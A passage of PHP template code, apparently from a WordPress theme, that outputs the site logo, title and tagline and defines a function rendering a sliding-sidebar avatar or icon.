					<img <?php echo $logo_size_att; ?> src="<?php echo asalah_option('asalah_default_logo'); ?>" class="site_logo img-responsive site_logo_image pull-left clearfix" alt="<?php bloginfo( 'name' ); ?>" />
				</a>
				<?php if (!$image_text_logo) {
					?>
					<!-- Site name for screen-reader-text -->
					<h1 class="screen-reader-text site_logo site-title pull-left clearfix"><?php bloginfo( 'name' ); ?></h1>
					<?php
					// check site tagline under image logo
					if ( asalah_option('asalah_show_tagline_under_imagelogo') == true) {
					?>
						<p class="title_tagline_below logo_tagline site_tagline"><?php echo get_bloginfo( 'description' ); ?></p>
					<?php
					} // end site tagline under image logo
				}
			}

			if (!$image_logo_only || $image_text_logo) {
				if ($image_text_logo) { ?> <div class="logo_text_content"> <?php } ?>
					<h1 class="site_logo site-title pull-left clearfix">
						<a title="<?php bloginfo( 'name' ); ?>" href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a><?php
						?><span class="logo_dot skin_color">.</span>
					</h1>
					<?php
					if (!$logo_at_topbar) {
						// check if tagline set to below or beside
						if (( asalah_option('asalah_show_tagline') == 'below' || asalah_option('asalah_show_tagline') == 'beside' ) ) :
							$description = get_bloginfo( 'description' );
							// if blog description exists
							if ($description) {
								$tagline_class = 'title_tagline_beside';
								$tagline_class = 'title_tagline_'.asalah_option('asalah_show_tagline');
								?>
								<p class="<?php echo $tagline_class; ?> logo_tagline site_tagline"><?php echo $description; ?></p>
							<?php
							} // end condition if blog description exists
						endif; // end condition if tagline set to below or beside
					}
				if ($image_text_logo) { ?> </div> <?php }
			} // end condition logo image or text
			?>
		</div> <!-- logo_wrapper -->
		<?php
	}
}

if (!function_exists('asalah_sliding_sidebar_infoicon')) {
	function asalah_sliding_sidebar_infoicon() {
		// use asalah_header_avatar if exist
		if ( asalah_option('asalah_header_avatar') ):
			// check if header avatar cropped using wordpress customizer
			if (filter_var(asalah_option('asalah_header_avatar'), FILTER_VALIDATE_URL)) {
				$avatar_url = asalah_option('asalah_header_avatar');
			} // else crop header avatar
			else {
				$avatar_url = 	wp_get_attachment_image_src(asalah_option('asalah_header_avatar'), array(40,40));
				$avatar_url = $avatar_url[0];
			}

			$sliding_icon_content = '<img class="img-responsive" alt="Header Avatar" src="'.$avatar_url.'">';
			$sliding_icon_classes = 'user_info_avatar_image';

			// if asalah_header_avatar don't exist
		else:
			$sliding_icon_content = '<i class="fa fa-align-center"></i>';
			$sliding_icon_classes = 'user_info_avatar_icon skin_color_hover';

		endif; // end image or icon condition for sliding icon
		?>
		<div class="header_info_wrapper">
			<a id="user_info_icon" class="user_info_avatar user_info_button <?php echo $sliding_icon_classes ?>" href="#">
				<?php echo $sliding_icon_content; ?>
			</a>
		</div>
	<?php // end condition sliding sidebar icon
	}
}
?>
